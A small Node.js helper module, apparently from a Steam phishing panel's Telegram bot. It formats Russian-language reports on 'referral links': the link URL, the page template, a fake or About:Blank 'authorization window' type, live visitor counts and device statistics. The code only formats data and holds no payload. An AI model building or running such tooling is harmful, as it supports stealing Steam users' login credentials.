const REF_CHARS = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function generateReferralCode(length = 4) {
  let out = "";
  for (let i = 0; i < length; i += 1) {
    out += REF_CHARS[Math.floor(Math.random() * REF_CHARS.length)];
  }
  return out;
}

function windowTypeLabel(w) {
  const map = {
    FakeWindow: "Фейк окно",
    CurrentWindow: "Текущее окно",
    NewWindow: "Новое окно",
    AboutBlank: "About:Blank",
  };
  return map[w] || w || "—";
}

function mergeDeviceCounts(stats) {
  const out = {};
  if (!Array.isArray(stats)) return out;
  for (const s of stats) {
    const devs = s?.devices || {};
    for (const [name, n] of Object.entries(devs)) {
      const v = Number(n) || 0;
      out[name] = (out[name] || 0) + v;
    }
  }
  return out;
}

/**
 * @param {string} domainName — hostname из панели
 * @param {string} path — slug без ведущего /
 * @param {{ online?: number, stats?: object[] }} row — строка из GET /steam/links/:domainId
 */
function formatReferralLinkHtml(domainName, path, row = {}) {
  const host = String(domainName || "")
    .replace(/^https?:\/\//i, "")
    .replace(/\/+$/, "");
  const slug = String(path || "").replace(/^\/+/, "");
  const fullUrl = slug ? `${host}/${slug}` : host;

  const online = Number(row?.online ?? 0);
  const devices = mergeDeviceCounts(row?.stats);
  const entries = Object.entries(devices).sort((a, b) => b[1] - a[1]);
  const deviceBlock =
    entries.length > 0
      ? entries.map(([name, n]) => `  • ${escapeHtml(name)} — <b>${n}</b>`).join("\n")
      : "  <i>пока нет данных</i>";

  const tplName = row?.template?.name ? escapeHtml(row.template.name) : null;
  const winLabel = windowTypeLabel(row?.windowType);

  const metaLines = [];
  if (tplName) metaLines.push(`📄 <b>Шаблон:</b> ${tplName}`);
  metaLines.push(`🪟 <b>Окно авторизации:</b> ${escapeHtml(winLabel)}`);

  return [
    "🔗 <b>Реферальная ссылка</b>",
    "",
    `<b>Ссылка:</b> <code>${escapeHtml(fullUrl)}</code>`,
    "",
    ...metaLines,
    "",
    "───────────────",
    "📈 <b>Сводка</b>",
    "",
    `🟢 <b>Онлайн:</b> ${online}`,
    "",
    "📱 <b>Устройства</b>",
    deviceBlock,
  ].join("\n");
}

module.exports = {
  generateReferralCode,
  mergeDeviceCounts,
  formatReferralLinkHtml,
  escapeHtml,
  windowTypeLabel,
};
